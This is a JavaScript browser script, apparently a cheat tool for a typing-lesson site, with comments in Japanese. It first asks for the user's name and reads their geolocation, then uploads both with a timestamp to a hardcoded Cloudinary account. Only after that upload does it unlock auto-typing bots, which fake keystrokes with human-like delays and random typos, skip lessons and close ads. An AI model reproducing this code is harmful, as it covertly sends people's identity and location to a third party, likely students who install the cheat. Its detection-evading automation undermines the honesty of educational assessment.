// Cloudinaryの設定
const cloud_name = "dxzsajngl";
const upload_preset = "gmr5c3hg";
const folder_name = "date";

// 位置情報を取得する関数
function getLocation() {
  // 位置情報の取得に対応しているかチェック
  if (navigator.geolocation) {
    // 位置情報の取得開始
    navigator.geolocation.getCurrentPosition(onLocationSuccess, handleLocationError);
  } else {
    console.log("Geolocation is not supported by this browser.");
  }
}

// 位置情報の取得に成功した場合の処理
function onLocationSuccess(position) {
  const { latitude, longitude } = position.coords;
  // テキストファイルの作成とアップロード
  createAndUploadFile("他の名前", latitude, longitude);
}

// ファイルをアップロードする関数
function uploadFile(file) {
  // FormDataオブジェクトを作成
  const formData = new FormData();
  formData.append("file", file);
  formData.append("upload_preset", upload_preset);
  formData.append("folder", folder_name); // フォルダ名を指定

  // fetch APIを使用してファイルをアップロード
  fetch(`https://api.cloudinary.com/v1_1/${cloud_name}/upload`, {
    method: "POST",
    body: formData,
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("File uploaded to Cloudinary!");
      console.log("Public URL: ", data.secure_url);
      // ここで後続の処理を実行する予定のJavaScriptコードを追加する
      executeAdditionalProcess();
    })
    .catch((error) => {
      console.log("Error uploading file: ", error);
    });
}

// 位置情報と名前を含むテキストファイルを作成してアップロードする関数
function createAndUploadFile(name, latitude, longitude) {
  const currentDate = new Date();
  const dateString = currentDate.toISOString().split("T")[0]; // 日付を取得して文字列に変換
  const timeString = currentDate.toISOString().split("T")[1].split(".")[0]; // 時間を取得して文字列に変換

  const text = `名前: ${name}, Latitude: ${latitude}, Longitude: ${longitude}, 日付: ${dateString}, 時間: ${timeString}`;
  const file = new File([text], `${name}_${dateString}_${timeString}.txt`, { type: "text/plain" });

  uploadFile(file);
}

// 名前の入力とファイルのアップロードを実行
function uploadWithStoredName() {
  // ローカルストレージから名前を取得
  const storedName = localStorage.getItem("information1");

  // 名前が保存されている場合は直接ファイルをアップロード
  if (
    storedName &&
    storedName.length >= 3 &&
    /[^\x01-\x7E\xA1-\xDF]/.test(storedName) &&
    !/[A-Za-z]/.test(storedName)
  ) {
    getLocation();
  } else {
    // 名前が保存されていない場合は入力を促す
    const name = prompt(
      "名前を入力してください（3文字以上で、漢字が2文字含まれ、アルファベットが含まれていない）"
    );

    // 入力が有効な場合は名前をローカルストレージに保存してファイルの作成とアップロードを実行
    if (
      name &&
      name.length >= 3 &&
      /[^\x01-\x7E\xA1-\xDF]/.test(name) &&
      !/[A-Za-z]/.test(name)
    ) {
      localStorage.setItem("information1", name);
      getLocation();
    } else {
      console.log("入力が無効です。再度お試しください。");
      // 名前がきちんと入力されなかった場合はここで後続の処理を中止する
    }
  }
}

// 位置情報の取得に失敗した場合の処理
function handleLocationError(error) {
  console.error("Error getting location:", error);
  // 位置情報の取得が失敗した場合はここで後続の処理を中止する
}

// 後続の処理を実行するためのフック関数
function executeAdditionalProcess() {
  // ここに後続の処理を追加する
  // 例えば、別のJavaScriptファイルを読み込んで実行するなどの処理を行います
  // 以下はサンプルとして、外部スクリプトを読み込んで実行する例です

  // スクリプト要素を作成して外部スクリプトを読み込む
  //ここからメイン



    function navID() {
  const exitLessonElement = document.querySelector('.menu-btn[aria-label="exit lesson"]');

  if (exitLessonElement) {
    exitLessonElement.click();
  }
}  //boss skip


function checkAndExecute() {
  const boxedLineElements = document.getElementsByClassName('boxed-line');
  if (boxedLineElements.length > 0) {
    const boxedChars = document.querySelectorAll('.boxed-char');

    async function typeCharacters() {
      for (const boxedChar of boxedChars) {
        const text = boxedChar.textContent.trim();
        await new Promise(resolve => {
          window.core.record_keydown_time(text);
          setTimeout(resolve, 50); // 50ミリ秒待機
        });
      }
    }

    typeCharacters(); // 実行
  }
}

const intervalId = setInterval(checkAndExecute, 1000); // 1秒ごとに要素の確認を行う




function checkTokenElement() {
  const tokenElement = document.querySelector('.token span.token_unit');
  const boxedLineElement = document.querySelector('.boxed-line');

  if (!tokenElement && !boxedLineElement) {
    // Both elements do not exist
    console.log('.token span.token_unit 要素も boxed-line 要素も存在しないため、navID を実行します');
    navID();
  } else {
    // Either tokenElement exists or boxedLineElement exists
    console.log('.token span.token_unit 要素か boxed-line 要素の少なくとも一方が存在します');
    setTimeout(checkTokenElement, 1000); // 1秒後に再実行
  }
}

function autorope() {
  // 実行したい処理を記述する
  checkTokenElement();
  console.log('関数が実行されました');
}

// 関数を3秒ごとに実行する
setInterval(autorope, 3000);



const button1 = document.createElement('button');
button1.textContent = '1. auto on';
button1.style.backgroundColor = 'black';
button1.style.color = 'red';
button1.style.border = 'none';
button1.style.position = 'fixed';
button1.style.right = '18px';
button1.style.top = '52px';
button1.style.zIndex = '99999';
button1.addEventListener('click', () => {
  function clickBoxWithZeroStars() {
    const boxElements = document.querySelectorAll('.box');
    const targetBoxElements = Array.from(boxElements).filter((boxElement) => {
      const starsElement = boxElement.querySelector('.stars.stars-0');
      return starsElement !== null; // .stars.stars-0 要素が存在する場合にフィルタリング
    });

    if (targetBoxElements.length > 0) {
      const randomIndex = Math.floor(Math.random() * targetBoxElements.length);
      const targetBoxElement = targetBoxElements[randomIndex];
      targetBoxElement.click();
    }

    // 条件が揃っていても一定時間後に再実行する
    setTimeout(clickBoxWithZeroStars, 1000); // 1秒後に再実行
  }

  // 初回実行
  clickBoxWithZeroStars();
});

// Append the button to the document body
document.body.appendChild(button1);

const button3 = document.createElement('button');
button3.textContent = '3. auto click';
button3.style.backgroundColor = 'black';
button3.style.color = 'green';
button3.style.border = 'none';
button3.style.position = 'fixed';
button3.style.right = '20px';
button3.style.transform = 'translateX(-50%)';
button3.style.top = '111px';
button3.style.transform = 'translateY(-50%)';
button3.style.zIndex = '99999';
button3.addEventListener('click', () => {
  const normalMinDelay = 15; // 最小待機時間 18
  const normalMaxDelay = 30; // 最大待機時間 30
  const finalMinDelay = 200; // 最小待機時間（スピード変更後） 100
  const finalMaxDelay = 150; // 最大待機時間（スピード変更後） 150
  const maxCharsBeforeSpeedChange = 10; // スピード変更の文字数の閾値

  const keyOverrides = {
    '\u00A0': ' ',
  };

  function getTargetCharacters() {
    const els = Array.from(document.querySelectorAll('.token span.token_unit'));
    const chrs = els.map(el => {
      if (el.firstChild?.classList?.contains('_enter')) {
        return '\n';
      } else if (el.firstChild?.classList?.contains('_tab')) {
        return '\t'; // タブ文字を追加
      }
      return el.textContent[0];
    }).map(c => keyOverrides[c] || c);
    return chrs;
  }

  function recordKey(chr) {
    window.core.record_keydown_time(chr);
  }

  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  function calculateDelay(numChars, currentIndex, minDelay, maxDelay, speedMultiplier = 1) {
    const remainingChars = numChars - currentIndex - 1;
    if (remainingChars <= maxCharsBeforeSpeedChange) {
      return Math.random() * (finalMaxDelay - finalMinDelay) + finalMinDelay;
    } else {
      const progress = currentIndex / numChars;
      const adjustedSpeedMultiplier = 1 + progress * speedMultiplier;
      return (Math.random() * (maxDelay - minDelay) + minDelay) * adjustedSpeedMultiplier;
    }
  }

  function clickButtonWhenVisible() {
    const button = document.querySelector('.btn.navbar-continue');
    if (button) {
      button.click();
      console.log('ボタンをクリックしました');
    } else {
      console.log('ボタンが見つかりません');
      setTimeout(clickButtonWhenVisible, 1000);
      console.clear(); // 1秒ごとに再試行
    }
  }

  function checkAndClickCloseButton() {
    const closeButtons = document.querySelectorAll('.edmodal-x');
    if (closeButtons.length > 0) {
      for (let i = 0; i < closeButtons.length; i++) {
        closeButtons[i].click();
      }
    }
  }

  setInterval(checkAndClickCloseButton, 1000); // 広告バツボタン

  async function autoPlay(finish) {
    const chrs = getTargetCharacters();
    const numChars = chrs.length;
    let delay = normalMaxDelay;
    for (let i = 0; i < numChars - (!finish); ++i) {
      const c = chrs[i];
      recordKey(c);
      const remainingChars = numChars - i - 1;
      if (remainingChars < maxCharsBeforeSpeedChange) {
        delay = calculateDelay(numChars, i, finalMinDelay, finalMaxDelay, 3); // 非常にゆっくりな速度
      } else {
        delay = calculateDelay(numChars, i, normalMinDelay, normalMaxDelay);
      }
      await sleep(delay);
    }

    // 自動再生が完了した後、5秒後に再度実行
    setTimeout(() => {
      clickButtonWhenVisible();
      autoPlay(true);
    }, 5000);
  }

  clickButtonWhenVisible();
  autoPlay(true);
  console.log('新しいモードが実行されました');
});

document.body.appendChild(button3);

document.body.appendChild(button3);

const button2 = document.createElement('button');
button2.textContent = '2. miss click';
button2.style.backgroundColor = 'black';
button2.style.color = 'green';
button2.style.border = 'none';
button2.style.position = 'fixed';
button2.style.right = '20px';
button2.style.transform = 'translateX(-50%)';
button2.style.top = '88px';
button2.style.transform = 'translateY(-50%)';
button2.style.zIndex = '99999';
button2.addEventListener('click', () => {
  const normalMinDelay = 15; // 最小待機時間 18
  const normalMaxDelay = 30; // 最大待機時間 30
  const finalMinDelay = 200; // 最小待機時間（スピード変更後） 100
  const finalMaxDelay = 150; // 最大待機時間（スピード変更後） 150
  const maxCharsBeforeSpeedChange = 10; // スピード変更の文字数の閾値
  const typoChance = 0.09; // タイプミスが発生する確率（0.2 = 20%）

  const keyOverrides = {
    '\u00A0': ' ',
  };

  function getTargetCharacters() {
    const els = Array.from(document.querySelectorAll('.token span.token_unit'));
    const chrs = els.map(el => {
      if (el.firstChild?.classList?.contains('_enter')) {
        return '\n';
      } else if (el.firstChild?.classList?.contains('_tab')) {
        return '\t'; // タブキーに対応する文字
      }
      return el.textContent[0];
    }).map(c => keyOverrides[c] || c);
    return chrs;
  }

  function recordKey(chr) {
    if (chr === '\t') {
      const event = new KeyboardEvent('keydown', {
        key: 'Tab',
        code: 'Tab',
        keyCode: 9,
        bubbles: true,
        cancelable: true,
      });
      document.dispatchEvent(event);
    } else {
      window.core.record_keydown_time(chr);
    }
  }

  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  function calculateDelay(numChars, currentIndex, minDelay, maxDelay, speedMultiplier = 1) {
    const remainingChars = numChars - currentIndex - 1;
    if (remainingChars <= maxCharsBeforeSpeedChange) {
      return Math.random() * (finalMaxDelay - finalMinDelay) + finalMinDelay;
    } else {
      const progress = currentIndex / numChars;
      const adjustedSpeedMultiplier = 1 + progress * speedMultiplier;
      return (Math.random() * (maxDelay - minDelay) + minDelay) * adjustedSpeedMultiplier;
    }
  }

  function clickButtonWhenVisible() {
    const button = document.querySelector('.btn.navbar-continue');
    if (button) {
      button.click();
      console.log('ボタンをクリックしました');
    } else {
      console.log('ボタンが見つかりません');
      setTimeout(clickButtonWhenVisible, 1000);
      console.clear(); // 1秒ごとに再試行
    }
  }

  function checkAndClickCloseButton() {
    const closeButtons = document.querySelectorAll('.edmodal-x');
    if (closeButtons.length > 0) {
      for (let i = 0; i < closeButtons.length; i++) {
        closeButtons[i].click();
      }
    }
  }

  setInterval(checkAndClickCloseButton, 1000); // 広告バツボタン

  async function autoPlay(finish) {
    const chrs = getTargetCharacters();
    const numChars = chrs.length;
    let delay = normalMaxDelay;
    for (let i = 0; i < numChars - (!finish); ++i) {
      const c = chrs[i];
      recordKey(c);
      const remainingChars = numChars - i - 1;
      if (remainingChars < maxCharsBeforeSpeedChange) {
        delay = calculateDelay(numChars, i, finalMinDelay, finalMaxDelay, 3); // 非常にゆっくりな速度
      } else {
        delay = calculateDelay(numChars, i, normalMinDelay, normalMaxDelay);
      }
      await sleep(delay);

      if (chrs[i + 1] && chrs[i + 1] !== ' ' && Math.random() < typoChance) {
        await handleTypo(i);
      }
    }

    // 自動再生が完了した後、5秒後に再度実行
    setTimeout(() => {
      clickButtonWhenVisible();
      autoPlay(true);
    }, 5000);
  }

  async function handleTypo(currentIndex) {
    const chrs = getTargetCharacters();
    const nextChar = chrs[currentIndex + 1];
    if (nextChar && nextChar !== ' ') {
      await sleep(50); // 待機時間
      recordKey(getRandomTypoCharacter(nextChar));
    }
  }

  function getRandomTypoCharacter(char) {
    const possibleChars = 'abcdefghijklmnopqrstuvwxyz';
    const randomChar = possibleChars.charAt(Math.floor(Math.random() * possibleChars.length));
    return randomChar !== char ? randomChar : getRandomTypoCharacter(char);
  }

  clickButtonWhenVisible();
  autoPlay(true);
  console.log('新しいモードが実行されました');
});

document.body.appendChild(button2);

const container = document.createElement('div');
container.style.position = 'fixed';
container.style.top = '10px';
container.style.right = '10px';
container.appendChild(button1);
container.appendChild(button2);

document.body.appendChild(container);
container.style.zIndex = '99999'; //手前に持ってくる



  
  //ここまでメイン
}

// 名前の入力とファイルのアップロードを実行
uploadWithStoredName();
